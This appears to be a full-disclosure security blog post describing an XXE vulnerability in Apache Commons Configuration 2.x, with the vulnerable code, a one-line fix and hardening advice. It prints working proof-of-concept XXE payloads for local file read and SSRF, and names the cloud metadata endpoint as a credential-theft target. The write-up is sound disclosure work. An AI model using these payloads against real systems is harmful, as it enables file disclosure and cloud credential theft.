---
layout: post
title: "Designed for Untrusted Input, Except This"
subtitle: "Apache Commons Configuration's security page promises it's built to process untrusted config files. Its XML reader resolves external entities by default. Feed it a DOCTYPE and it reads your files."
date: 2026-09-07
tags: [xxe, java, ssrf, cwe-611, full-disclosure]
read_time: "6 min read"
---

This one is a Java classic — XXE — but with a twist that takes it out of "well, don't feed it untrusted XML" territory: the library's own documentation says feeding it untrusted XML is *supported*.

[Apache Commons Configuration](https://commons.apache.org/proper/commons-configuration/) is an extremely widely-used config library. Its `XMLConfiguration` reader loads `.xml` config through `Configurations.xml(...)`. And its security page makes an explicit promise:

> "For Commons Configuration 2.x, the library is **designed to support processing untrusted configuration files**, without allowing those to trigger arbitrary code execution or denial of service situations."

That page even lists the CVEs they fixed to keep that promise — the interpolation RCE (CVE-2022-33980), the DoS ones (CVE-2024-29131/29133). It never mentions XXE. And the parser was never hardened against it.

## The boring part

XML external entities are the oldest trick in the parser book. A document can declare `<!ENTITY x SYSTEM "file:///etc/passwd">` and reference `&x;`, and a parser left at defaults will happily go read that file and substitute its contents. The fix has been standard for a decade: disallow DOCTYPE declarations, or at minimum turn off external entity resolution. Every XML parser factory can do it in one call.

## The tilt-your-head part

`XMLConfiguration.createDocumentBuilder()`:

```java
final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();  // no hardening
if (isValidating()) { ... }
final DocumentBuilder result = factory.newDocumentBuilder();
result.setEntityResolver(this.entityResolver);   // DefaultEntityResolver
```

The factory is created at JAXP defaults: no `disallow-doctype-decl`, no `FEATURE_SECURE_PROCESSING`, external general/parameter entities and external DTD loading all left **on**. And the `DefaultEntityResolver` only resolves entities pre-registered by public id; for anything else it returns `null`, which tells the JAXP parser to go do "default processing" — i.e. fetch the external SYSTEM entity itself. So the one component named like a guard actively hands unregistered external entities back to the parser to resolve.

The result: `Configurations.xml()`, the default reader, is a full XXE — arbitrary local file read and SSRF — against exactly the "untrusted configuration files" the security page says are supported.

## Proof

Live, JDK 25, against commons-configuration2 **2.15.1** (the latest release) and confirmed on 2.10.1:

<div class="term">
  <div class="term-bar"><span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span><span class="term-title">java CommonsConfigXXE — commons-configuration2 2.15.1</span></div>
<pre><span class="dim">-- Vector 1: local file disclosure --</span>
&lt;!DOCTYPE cfg [ &lt;!ENTITY x SYSTEM "file:///.../secret/xxe_secret.txt"&gt; ]&gt;
&lt;cfg&gt;&lt;value&gt;&amp;x;&lt;/value&gt;&lt;/cfg&gt;
value=[<span class="warn">TOP-SECRET-XXE-MARKER-abc123-kali</span>]

<span class="dim">-- Vector 2: SSRF (attacker-directed outbound request) --</span>
&lt;!ENTITY x SYSTEM "http://127.0.0.1:PORT/ssrf-probe?leak=metadata"&gt;
SERVER-SAW=[<span class="bad">GET /ssrf-probe?leak=metadata</span>]</pre>
</div>

The secret file's contents came back as a config value. The parser issued a live outbound GET during default config parsing — point that at `http://169.254.169.254/latest/meta-data/…` and it's cloud credential theft.

## The control that settles it

Sibling libraries whose job is *also* parsing untrusted XML reject the identical payload by default: `jackson-dataformat-xml` throws `WstxParsingException: Undeclared general entity "x"` (Woodstox disables external entities by default), and `rome` is hardened with `disallow-doctype-decl`. The hardened form of Commons' own code is one line:

```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

With that, both PoCs throw at the DOCTYPE and nothing happens. The maintainers can't say "trusted input only" — their documentation says the opposite. That's what makes this a bug and not a caveat.

## Where this stands

Present on all 2.x through **2.15.1** (current latest) at time of writing, no CVE for the XXE, no fix. Full disclosure. If you parse any XML config from an untrusted or semi-trusted source (uploads, tenant-supplied config, config pulled from a URL): harden the parser yourself now with `disallow-doctype-decl`, or wrap the load, regardless of what the library does.

## Takeaways

- **A documented safety promise turns a caveat into a bug.** "Don't feed it untrusted input" is a valid answer only if the docs don't say the opposite. Here they do.
- **JAXP defaults are unsafe defaults.** `DocumentBuilderFactory.newInstance()` with no hardening is XXE-on. Every XML reader you own needs the one-line fix.
- **A resolver that returns `null` is a resolver that delegates to the parser.** "Return null for unknown entities" means "let JAXP fetch them" — the opposite of a guard.

<hr>

*Full disclosure. Present on `commons-configuration2` 2.x–2.15.1 (current latest) at time of writing; no CVE assigned for the XXE, no fix released. Reproduced live on JDK 25.*
